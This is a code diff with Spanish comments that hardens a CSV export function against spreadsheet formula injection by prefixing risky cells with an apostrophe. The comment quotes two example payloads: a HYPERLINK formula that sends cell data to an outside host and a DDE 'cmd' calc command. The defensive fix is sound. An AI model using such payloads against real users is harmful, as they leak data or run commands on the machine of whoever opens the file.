@@ -4,9 +4,31 @@ export function descargarCsv(
   columnas: { llave: string; etiqueta: string }[],
   filas: Record<string, unknown>[],
 ): void {
+  /**
+   * Dos problemas distintos, y el segundo no es de formato sino de seguridad.
+   *
+   * El primero es la gramática del CSV: comillas, comas y saltos de línea obligan a entrecomillar.
+   *
+   * El segundo: Excel, Numbers y LibreOffice **evalúan** una celda que empieza por `=`, `+`, `-`,
+   * `@`, tabulador o retorno de carro. Un nombre capturado en la calle como
+   * `=HYPERLINK("http://ajeno/?"&A1)` se ejecuta al abrir el archivo, en la máquina de quien lo
+   * abre, que aquí es el administrador. El camino real es el botón "Descargar rechazados" de la
+   * carga masiva: el texto lo escribe cualquiera con acceso a captura y el archivo lo abre el
+   * admin. Se neutraliza con un apóstrofo delante, que las tres hojas de cálculo entienden como
+   * "esto es texto" y no muestran.
+   */
+  const peligrosa = (texto: string) => {
+    if (!/^[=+\-@\t\r]/.test(texto)) return false;
+    // Un número negativo empieza por `-` y no es una fórmula. Si se le pusiera el apóstrofo, la
+    // hoja lo trataría como texto y dejaría de sumarse. `-2+3+cmd|' /C calc'!A0`, en cambio, no
+    // es un número, así que sí entra por aquí.
+    return !Number.isFinite(Number(texto));
+  };
+
   const escapar = (valor: unknown) => {
-    const texto = valor === null || valor === undefined ? "" : String(valor);
-    return /[",\n]/.test(texto) ? `"${texto.replace(/"/g, '""')}"` : texto;
+    const crudo = valor === null || valor === undefined ? "" : String(valor);
+    const texto = peligrosa(crudo) ? `'${crudo}` : crudo;
+    return /[",\n\r]/.test(texto) ? `"${texto.replace(/"/g, '""')}"` : texto;
   };
 
   const contenido = [
